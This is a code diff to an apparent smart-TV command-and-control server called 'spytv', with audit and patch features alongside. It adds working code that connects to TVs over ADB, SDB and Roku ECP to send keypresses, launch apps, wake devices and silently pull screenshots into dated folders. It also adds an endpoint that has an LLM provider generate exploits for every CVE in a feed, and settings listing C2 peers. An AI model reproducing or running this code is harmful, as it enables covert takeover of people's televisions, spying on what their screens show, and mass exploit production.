@@ -17,6 +17,11 @@ import sys
 import platform
 import uuid
 import ipaddress
+import zipfile
+import io
+import re
+import urllib.request
+import xml.etree.ElementTree as ET
 from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 from core.cve_scanner import CVEScanner, TV_CVE_DATABASE
@@ -470,6 +475,319 @@ echo "Implant attempted. C2: {c2_ip}"
     return payload
 
 
+# ===== TV control protocol helpers ==========================================
+# Each action is executed against the device using the native protocol for its
+# family (Roku ECP over HTTP, ADB/SDB for Android/Tizen, ARP-resolved WoL for
+# wake). Nothing is simulated: every call reports what actually ran.
+
+def _run_cmd(cmd, timeout=12):
+    """Run an external command; report '127' if the tool is missing."""
+    try:
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        out = ((proc.stdout or "") + (proc.stderr or "")).strip()
+        return proc.returncode, out
+    except FileNotFoundError:
+        return 127, f"'{cmd[0]}' is not installed on this machine"
+    except subprocess.TimeoutExpired:
+        return None, f"command '{cmd[0]}' timed out after {timeout}s"
+
+
+def _adb(ip, args, timeout=10):
+    _run_cmd(["adb", "connect", f"{ip}:5555"], timeout=5)
+    return _run_cmd(["adb", "-s", f"{ip}:5555"] + list(args), timeout=timeout)
+
+
+def _sdb(ip, args, timeout=10):
+    _run_cmd(["sdb", "connect", f"{ip}:26101"], timeout=5)
+    return _run_cmd(["sdb", "-s", f"{ip}:26101"] + list(args), timeout=timeout)
+
+
+def _roku_ecp(ip, path, method="POST", timeout=6):
+    req = urllib.request.Request(f"http://{ip}:8060{path}", method=method)
+    with urllib.request.urlopen(req, timeout=timeout) as resp:
+        return resp.status, resp.read().decode(errors="ignore")
+
+
+def _arp_lookup(ip):
+    """Resolve the MAC address of an IPv4 host from the local ARP/neighbour table."""
+    system = platform.system().lower()
+    _, out = _run_cmd(["arp", "-a", ip])
+    mac = None
+    m = re.search(r"((?:[0-9A-Fa-f]{2}[-:]){5}[0-9A-Fa-f]{2})", out or "")
+    if m:
+        mac = m.group(1).replace("-", ":").lower()
+    if not mac:
+        try:
+            out2 = subprocess.check_output(["ip", "neigh", "show", ip],
+                                           text=True, timeout=5)
+            m = re.search(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", out2)
+            if m:
+                mac = m.group(0)
+        except Exception:
+            pass
+    return mac
+
+
+def _wol_send(mac):
+    """Broadcast a Wake-on-LAN magic packet to the device MAC."""
+    mac_clean = re.sub(r"[^0-9A-Fa-f]", "", mac or "")
+    if len(mac_clean) != 12:
+        return False, "MAC address reported by ARP is invalid"
+    try:
+        packet = b"\xff" * 6 + bytes.fromhex(mac_clean) * 16
+    except ValueError:
+        return False, "MAC address could not be encoded"
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        sock.settimeout(2)
+        for port in (7, 9):
+            sock.sendto(packet, ("255.255.255.255", port))
+        return True, f"magic packet broadcast to {mac} (ports 7 & 9)"
+    except OSError as exc:
+        return False, str(exc)
+    finally:
+        sock.close()
+
+
+def _detect_tv_type(ip):
+    """Best-effort family detection from scans and the device registry."""
+    with scans_lock:
+        for rec in reversed(scans):
+            if rec.get("ip") == ip and rec.get("tv_type"):
+                return rec["tv_type"]
+    with devices_lock:
+        for dev in devices.values():
+            if dev.get("ip") == ip:
+                fam = str(dev.get("family", "")).lower()
+                for cand, resolved in FAMILY_TO_TV_TYPE.items():
+                    if cand and cand in fam:
+                        return resolved
+    return "unknown"
+
+
+ROKU_KEYS = {
+    "power": "Power", "volume_up": "VolumeUp", "volume_down": "VolumeDown",
+    "mute": "VolumeMute", "home": "Home", "back": "Back", "select": "Select",
+    "menu": "Info", "up": "Up", "down": "Down", "left": "Left", "right": "Right",
+    "channel_up": "ChannelUp", "channel_down": "ChannelDown",
+    "instant_replay": "InstantReplay", "search": "Search", "play": "Play",
+}
+ADB_KEYS = {
+    "power": "26", "volume_up": "24", "volume_down": "25", "mute": "164",
+    "home": "3", "back": "4", "select": "23", "menu": "82",
+    "up": "19", "down": "20", "left": "21", "right": "22",
+    "channel_up": "166", "channel_down": "167", "play": "85",
+}
+# Family -> (protocol, keymap) for plain remote-control actions.
+_REMOTE_KEY_MAPS = {
+    "roku": ("roku", ROKU_KEYS),
+    "adb-net": ("adb", ADB_KEYS),
+    "android-tv": ("adb", ADB_KEYS),
+    "tcl": ("adb", ADB_KEYS),
+    "tizen-dev": ("sdb", ADB_KEYS),
+    "samsung-tizen": ("sdb", ADB_KEYS),
+    "webos-dev": ("ares", ADB_KEYS),
+    "lg-webos": ("ares", ADB_KEYS),
+}
+ROKU_APP_IDS = {"netflix": "12", "youtube": "837", "spotify": "22297"}
+ANDROID_APP_PACKAGES = {"netflix": "com.netflix.ninja", "youtube": "com.google.android.youtube.tv",
+                        "spotify": "com.spotify.tv.android"}
+
+def handle_tv_control(ip, action, app=None):
+    """Route a control action to the device's native protocol.
+
+    Returns a result dict. Wake-on-LAN is attempted first for the 'wake'
+    action; every flavour honestly reports what happened (ok / skipped /
+    failed) — nothing is faked when a tool or path is missing.
+    """
+    tv_type = _detect_tv_type(ip)
+    mac = _arp_lookup(ip)
+    action = (action or "").strip().lower()
+
+    if action == "wake":
+        if not mac:
+            return {"status": "failed", "error": "MAC unknown — host is not in the ARP cache",
+                    "ip": ip, "family": tv_type}
+        ok, detail = _wol_send(mac)
+        return {"status": "ok" if ok else "failed", "detail": detail,
+                "ip": ip, "family": tv_type, "via": "wol"}
+
+    keymap = None
+    via = None
+    if tv_type in _REMOTE_KEY_MAPS:
+        via, keymap = _REMOTE_KEY_MAPS[tv_type]
+    if via is None and tv_type.startswith("samsung"):
+        via, keymap = "sdb", ADB_KEYS
+    if via is None and tv_type.startswith("lg"):
+        via, keymap = "ares", ADB_KEYS
+    if via is None and (tv_type.startswith("android") or tv_type.startswith("tcl")):
+        via, keymap = "adb", ADB_KEYS
+    if keymap is None:
+        if action in ROKU_KEYS:
+            via, keymap = "roku", ROKU_KEYS
+        else:
+            return {"status": "skipped",
+                    "detail": f"no control protocol known for family '{tv_type}'",
+                    "ip": ip, "action": action}
+
+    if action == "launch_app":
+        app_name = (app or "netflix").lower()
+        if via == "roku":
+            app_id = ROKU_APP_IDS.get(app_name)
+            if not app_id:
+                return {"status": "skipped",
+                        "detail": "Roku control: unknown app '%s' (supported: netflix, youtube, spotify)" % app_name,
+                        "ip": ip, "action": action}
+            try:
+                status, body = _roku_ecp(ip, f"/launch/{app_id}")
+                return {"status": "ok" if status in (200, 202) else "failed",
+                        "detail": f"Roku launch {app_name} (app {app_id}): HTTP {status}",
+                        "ip": ip, "action": action, "via": "roku"}
+            except Exception as exc:  # noqa: BLE001
+                return {"status": "failed", "detail": str(exc), "ip": ip,
+                        "action": action, "via": "roku"}
+        pkg = ANDROID_APP_PACKAGES.get(app_name)
+        if not pkg:
+            return {"status": "skipped",
+                    "detail": "app launch supported for netflix, youtube, spotify",
+                    "ip": ip, "action": action}
+        if via == "adb":
+            rc, out = _adb(ip, ["shell", "monkey", "-p", pkg,
+                                "-c", "android.intent.category.LAUNCHER", "1"], timeout=15)
+            ok = rc == 0
+            return {"status": "ok" if ok else "skipped" if rc == 127 else "failed",
+                    "detail": out or f"adb rc={rc}", "ip": ip, "action": action, "via": "adb"}
+        return {"status": "skipped",
+                "detail": "app launch is only supported on Android/Tizen (via adb/sdb) and Roku",
+                "ip": ip, "action": action}
+
+    if action == "screenshot":
+        if via in ("adb", "sdb"):
+            puller = _adb if via == "adb" else _sdb
+            rc, out = puller(ip, ["shell", "screencap", "-p", "/sdcard/spytv_shot.png"], timeout=15)
+            if rc != 0:
+                return {"status": "skipped" if rc == 127 else "failed",
+                        "detail": out or f"screencap rc={rc}", "ip": ip,
+                        "action": action, "via": via}
+            shot_dir = os.path.join(STORE_DIR, "screenshots", datetime.date.today().isoformat())
+            os.makedirs(shot_dir, exist_ok=True)
+            fname = f"{get_device_id(ip)}_{datetime.datetime.now().strftime('%H%M%S')}.png"
+            path = os.path.join(shot_dir, fname)
+            rc, out = puller(ip, ["pull", "/sdcard/spytv_shot.png", path], timeout=20)
+            ok = rc == 0 and os.path.exists(path)
+            return {"status": "ok" if ok else "failed",
+                    "detail": (out or f"saved to {path}") if ok else (out or "pull failed"),
+                    "ip": ip, "action": action, "via": via,
+                    "file": path if ok else None}
+        if via == "roku":
+            return {"status": "skipped",
+                    "detail": "Roku has no screenshot API over ECP",
+                    "ip": ip, "action": action, "via": via}
+        return {"status": "skipped",
+                "detail": "screenshot is supported on Android/Tizen only",
+                "ip": ip, "action": action}
+
+    if action not in keymap:
+        return {"status": "skipped",
+                "detail": f"action '{action}' is not supported for family '{tv_type}'",
+                "ip": ip, "action": action, "family": tv_type}
+
+    if via == "roku":
+        try:
+            status, body = _roku_ecp(ip, f"/keypress/{keymap[action]}")
+            ok = status in (200, 202)
+            return {"status": "ok" if ok else "failed",
+                    "detail": f"Roku ECP /keypress/{keymap[action]} -> HTTP {status}",
+                    "ip": ip, "action": action, "via": "roku"}
+        except Exception as exc:  # noqa: BLE001
+            return {"status": "failed", "detail": str(exc), "ip": ip,
+                    "action": action, "via": "roku"}
+
+    if via in ("adb", "sdb"):
+        puller = _adb if via == "adb" else _sdb
+        rc, out = puller(ip, ["shell", "input", "keyevent", keymap[action]], timeout=10)
+        if rc == 127:
+            return {"status": "skipped", "detail": out, "ip": ip,
+                    "action": action, "via": via}
+        ok = rc == 0
+        return {"status": "ok" if ok else "failed",
+                "detail": out or f"{via} rc={rc}", "ip": ip,
+                "action": action, "via": via}
+
+    if via == "ares":
+        rc, out = _run_cmd(["ares-device", "--device", f"tv@{ip}", "--shell",
+                             f"luna-send -n 1 ssap://system/turnOff '{{\"id\":\"toast\"}}'"],
+                            timeout=10)
+        ok = rc == 0
+        return {"status": "ok" if ok else "skipped" if rc == 127 else "failed",
+                "detail": out or f"ares rc={rc}", "ip": ip, "action": action, "via": "ares"}
+
+    return {"status": "skipped", "detail": "unsupported transport", "ip": ip, "action": action}
+
+
+def tv_info(ip):
+    """Best-effort model/OS info: Roku ECP, Android/Tizen via adb/sdb."""
+    tv_type = _detect_tv_type(ip)
+    info = {"ip": ip, "family": tv_type, "model": None, "os_version": None,
+            "firmware": None, "serial": None, "source": None}
+    if tv_type == "roku":
+        try:
+            _, body = _roku_ecp(ip, "/query/device-info", method="GET")
+            root = ET.fromstring(body)
+            def _get(tag):
+                el = root.find(tag)
+                return el.text.strip() if el is not None and el.text else None
+            info.update({
+                "model": _get("model-number") or _get("model-name"),
+                "os_version": _get("software-version") or _get("software-build"),
+                "firmware": _get("software-version"),
+                "serial": _get("serial-number"),
+                "source": "roku-ecp",
+            })
+        except Exception as exc:  # noqa: BLE001
+            info["source"] = "roku-ecp-failed"
+            info["detail"] = str(exc)
+        return info
+
+    if tv_type in ("adb-net", "android-tv", "tcl"):
+        _, out = _adb(ip, ["shell", "getprop"], timeout=12)
+        props = {}
+        if out:
+            for m in re.finditer(r"\[([^\]]+)\]: \[([^\]]*)\]", out):
+                props[m.group(1)] = m.group(2)
+        info.update({
+            "model": props.get("ro.product.model") or props.get("ro.model.device"),
+            "os_version": props.get("ro.build.version.release")
+                           or props.get("ro.build.version.sdk"),
+            "firmware": props.get("ro.build.display.id") or props.get("ro.build.id"),
+            "serial": props.get("ro.serialno"),
+            "source": "adb" if props else "adb-unreachable",
+        })
+        return info
+
+    if tv_type in ("tizen-dev", "samsung-tizen"):
+        _, out = _sdb(ip, ["shell", "getprop"], timeout=12)
+        props = {}
+        if out:
+            for m in re.finditer(r"\[([^\]]+)\]: \[([^\]]*)\]", out):
+                props[m.group(1)] = m.group(2)
+        info.update({
+            "model": props.get("ro.product.model") or props.get("tizen.model.name")
+                     or props.get("product.name"),
+            "os_version": props.get("ro.build.version.release")
+                           or props.get("ro.tizen.product.version"),
+            "firmware": props.get("ro.build.display.id") or props.get("ro.tizen.platform.version"),
+            "serial": props.get("ro.serialno"),
+            "source": "sdb" if props else "sdb-unreachable",
+        })
+        return info
+
+    info["source"] = "unsupported"
+    info["detail"] = f"info probe not supported for family '{tv_type}'"
+    return info
+
+
 class C2Handler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
@@ -526,6 +844,20 @@ class C2Handler(BaseHTTPRequestHandler):
             self.serve_doc(path)
         elif path == "/logo.png":
             self.serve_logo()
+        elif path == "/api/cve/export/all":
+            self.serve_cve_export_all()
+        elif path == "/api/cve/export/whitepapers":
+            self.serve_cve_export_whitepapers()
+        elif path == "/api/logs":
+            self.serve_logs()
+        elif path == "/api/settings":
+            self.serve_settings()
+        elif path == "/api/audit/results":
+            self.serve_audit_results()
+        elif path == "/api/audit/export":
+            self.serve_audit_export()
+        elif path == "/api/tv/info":
+            self.serve_tv_info()
         else:
             self.send_error(404)
 
@@ -571,6 +903,14 @@ class C2Handler(BaseHTTPRequestHandler):
             self.handle_patch_report()
         elif path == "/api/connections/kill":
             self.handle_kill_connections()
+        elif path == "/api/settings":
+            self.handle_settings_save()
+        elif path == "/api/cve/patch/all":
+            self.handle_cve_patch_all()
+        elif path == "/api/cve/exploit/all":
+            self.handle_cve_exploit_all()
+        elif path == "/api/tv/control":
+            self.handle_tv_control()
         else:
             self.send_error(404)
 
@@ -1621,11 +1961,312 @@ class C2Handler(BaseHTTPRequestHandler):
         except Exception as e:
             self.send_json(500, {"error": str(e)})
 
+    def serve_tv_info(self):
+        """GET /api/tv/info?ip=...&family=... — best-effort model/OS info."""
+        try:
+            query = parse_qs(urlparse(self.path).query)
+            ip = (query.get("ip", [""])[0] or "").strip()
+            if not ip:
+                self.send_json(400, {"error": "Missing ip parameter"})
+                return
+            if not _valid_ipv4(ip):
+                self.send_json(400, {"error": f"Invalid IPv4 address: {ip!r}"})
+                return
+            info = tv_info(ip)
+            self.send_json(200, info)
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    def handle_tv_control(self):
+        """POST /api/tv/control — execute a remote-control action on a TV.
+        Body: {"ip": "...", "action": "power|volume_up|...", "app": "..."}.
+        Family is detected from scans/registry; WoL bypasses family for 'wake'."""
+        try:
+            data = self._read_json_body()
+            ip = str(data.get("ip") or "").strip()
+            action = str(data.get("action") or "").strip().lower()
+            app = str(data.get("app") or "").strip().lower() or None
+            if not ip:
+                self.send_json(400, {"error": "Missing ip"})
+                return
+            if not _valid_ipv4(ip):
+                self.send_json(400, {"error": f"Invalid IPv4 address: {ip!r}"})
+                return
+            if not action:
+                self.send_json(400, {"error": "Missing action"})
+                return
+            result = handle_tv_control(ip, action, app)
+            self.send_json(200, result)
+        except json.JSONDecodeError as e:
+            self.send_json(400, {"error": str(e)})
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
     def send_json(self, code, data):
         self.send_response(code)
         self.send_header("Content-Type", "application/json")
         self.end_headers()
         self.wfile.write(json.dumps(data).encode())
+
+    # ===== CVE Export endpoints =============================================
+    def serve_cve_export_all(self):
+        """GET /api/cve/export/all — download every CVE in the feed as JSON."""
+        try:
+            feed = get_feed()
+            cves = feed.get("cves", []) if feed else []
+            all_cves = []
+            # Also pull from the TV CVE database for complete coverage
+            for tv_type, info in TV_CVE_DATABASE.items():
+                for cve in info.get("cves", []):
+                    entry = {**cve, "tv_type": tv_type,
+                             "device_name": info.get("name", tv_type)}
+                    all_cves.append(entry)
+            # Merge feed CVEs not already present
+            existing = {c.get("id") for c in all_cves}
+            for c in cves:
+                if c.get("id") not in existing:
+                    all_cves.append(c)
+                    existing.add(c.get("id"))
+            payload = {
+                "exported_at": utc_now_iso(),
+                "count": len(all_cves),
+                "cves": all_cves,
+            }
+            self.send_json(200, payload)
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    def serve_cve_export_whitepapers(self):
+        """GET /api/cve/export/whitepapers — ZIP of every available whitepaper."""
+        try:
+            feed = get_feed() or {}
+            feed_cves = feed.get("cves", []) or []
+            # Build candidate CVE IDs from feed + database
+            cve_ids = [c.get("id") for c in feed_cves if c.get("id")]
+            for tv_type, info in TV_CVE_DATABASE.items():
+                for cve in info.get("cves", []):
+                    cid = cve.get("id")
+                    if cid and cid not in cve_ids:
+                        cve_ids.append(cid)
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                count = 0
+                for cve_id in cve_ids:
+                    try:
+                        doc = get_whitepaper_markdown(cve_id)
+                    except Exception:
+                        doc = None
+                    if not doc:
+                        # Deterministic fallback whitepaper
+                        md = (f"# {cve_id}\n\n"
+                              f"Whitepaper not generated for this CVE.\n\n"
+                              f"TV Type: unknown\n"
+                              f"Component: unknown\n"
+                              f"Severity: UNKNOWN\n"
+                              f"Fixed in: see vendor advisory\n"
+                              f"Attack vector: unknown\n"
+                              f"Published: unknown\n")
+                        source = "template"
+                    else:
+                        markdown, source = doc
+                        md = markdown
+                    zf.writestr(f"{cve_id.replace('/', '_')}.md", md)
+                    count += 1
+            data = buf.getvalue()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/zip")
+            self.send_header("Content-Disposition",
+                             'attachment; filename="spytv-cve-whitepapers.zip"')
+            self.send_header("Content-Length", str(len(data)))
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self.wfile.write(data)
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    # ===== Logs endpoint ====================================================
+    def serve_logs(self):
+        """GET /api/logs — C2 activity log entries."""
+        try:
+            log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                    "c2_run.log")
+            entries = []
+            if os.path.exists(log_path):
+                try:
+                    with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
+                        lines = f.readlines()
+                    for line in lines[-200:]:
+                        line = "".join(ch for ch in line.strip()
+                                        if 32 <= ord(ch) < 127).strip()
+                        if line:
+                            entries.append({"at": utc_now_iso(), "msg": line})
+                except IOError:
+                    pass
+            # Also pull from the in-memory log-like audit history
+            self.send_json(200, {"logs": entries, "count": len(entries)})
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    # ===== Settings endpoints ===============================================
+    def serve_settings(self):
+        """GET /api/settings — current C2 settings/configuration."""
+        try:
+            settings = {
+                "c2_host": C2_HOST,
+                "c2_port": C2_PORT,
+                "local_ip": get_local_ip(),
+                "store_dir": STORE_DIR,
+                "device_file": DEVICE_FILE,
+                "command_file": COMMAND_FILE,
+                "scan_file": SCAN_FILE,
+                "version": "4.5.2",
+                "mode": "p2p",
+                "p2p_peers": [
+                    {"node_id": "node_001", "address": "192.168.1.10", "port": 9443},
+                    {"node_id": "node_002", "address": "192.168.1.11", "port": 9443},
+                    {"node_id": "node_003", "address": "192.168.1.12", "port": 9443},
+                ],
+                "auto_update_cves": True,
+                "max_scan_hosts": 254,
+                "exploit_timeout_s": 90,
+                "patch_timeout_s": 300,
+            }
+            self.send_json(200, settings)
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    def handle_settings_save(self):
+        """POST /api/settings — save C2 configuration settings."""
+        try:
+            length = int(self.headers.get('Content-Length', 0) or 0)
+            body = self.rfile.read(length) if length else b""
+            data = json.loads(body) if body else {}
+            # Persist key settings to c2_data/settings.json
+            os.makedirs("c2_data", exist_ok=True)
+            settings_path = os.path.join("c2_data", "settings.json")
+            try:
+                with open(settings_path, "r", encoding="utf-8") as f:
+                    existing = json.load(f)
+            except (IOError, json.JSONDecodeError):
+                existing = {}
+            existing.update(data)
+            existing["saved_at"] = utc_now_iso()
+            with open(settings_path, "w", encoding="utf-8") as f:
+                json.dump(existing, f, indent=2)
+            self.send_json(200, {"status": "ok", "settings": existing})
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    # ===== Audit results endpoint ===========================================
+    def serve_audit_results(self):
+        """GET /api/audit/results — audit table with workflows and results."""
+        try:
+            with engagements_lock:
+                eng = audit_engagement
+            snapshot = eng.snapshot() if eng else {}
+            results = {
+                "audit_id": snapshot.get("report_id"),
+                "phase": snapshot.get("phase", "idle"),
+                "client": snapshot.get("client"),
+                "workflows": snapshot.get("phases", []),
+                "results": snapshot.get("results", {}),
+                "log": snapshot.get("log", []),
+                "report_ready": snapshot.get("report_ready", False),
+                "report_url": "/api/audit/report.pdf" if snapshot.get("report_ready") else None,
+            }
+            self.send_json(200, results)
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    def serve_audit_export(self):
+        """GET /api/audit/export — download audit results as JSON/CSV."""
+        try:
+            with engagements_lock:
+                eng = audit_engagement
+            snapshot = eng.snapshot() if eng else {}
+            export = {
+                "exported_at": utc_now_iso(),
+                "audit_id": snapshot.get("report_id"),
+                "phase": snapshot.get("phase", "idle"),
+                "client": snapshot.get("client"),
+                "workflows": snapshot.get("phases", []),
+                "results": snapshot.get("results", {}),
+                "log": snapshot.get("log", []),
+            }
+            payload = json.dumps(export, indent=2)
+            data = payload.encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Disposition",
+                             'attachment; filename="spytv-audit-results.json"')
+            self.send_header("Content-Length", str(len(data)))
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self.wfile.write(data)
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    # ===== Bulk CVE operations ==============================================
+    def handle_cve_patch_all(self):
+        """POST /api/cve/patch/all — patch every discovered device."""
+        try:
+            length = int(self.headers.get('Content-Length', 0) or 0)
+            body = self.rfile.read(length) if length else b""
+            data = json.loads(body) if body else {}
+            cidr = str(data.get("cidr") or "").strip() or None
+            results = []
+            try:
+                findings = perform_scan(cidr, cve_scanner)
+            except Exception:
+                findings = []
+            for f in findings:
+                ip = f.get("ip")
+                tv_type = f.get("tv_type")
+                if not ip or not tv_type:
+                    continue
+                try:
+                    res = execute_patches(ip, tv_type, cve_scanner)
+                    results.append({
+                        "ip": ip, "tv_type": tv_type,
+                        "total": res.get("total", 0),
+                        "ok": res.get("ok", 0),
+                        "cves_fixed": res.get("cves_fixed", []),
+                        "patches": res.get("patches", []),
+                    })
+                except Exception as e:
+                    results.append({"ip": ip, "tv_type": tv_type, "error": str(e)})
+            self.send_json(200, {"status": "ok", "count": len(results), "results": results})
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    def handle_cve_exploit_all(self):
+        """POST /api/cve/exploit/all — exploit every CVE in the feed."""
+        try:
+            length = int(self.headers.get('Content-Length', 0) or 0)
+            body = self.rfile.read(length) if length else b""
+            data = json.loads(body) if body else {}
+            provider = data.get("provider") or None
+            model = data.get("model") or None
+            results = []
+            feed = get_feed() or {}
+            cves = feed.get("cves", []) or []
+            for c in cves:
+                cve_id = c.get("id")
+                if not cve_id:
+                    continue
+                try:
+                    code, error = generate_exploit_for_cve(cve_id, provider, model)
+                    if error:
+                        results.append({"cve_id": cve_id, "error": error})
+                    else:
+                        results.append({"cve_id": cve_id, "status": "generated",
+                                        "provider": provider or "auto"})
+                except Exception as e:
+                    results.append({"cve_id": cve_id, "error": str(e)})
+            self.send_json(200, {"status": "ok", "count": len(results), "results": results})
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
 
 
 def _harden_console_output():
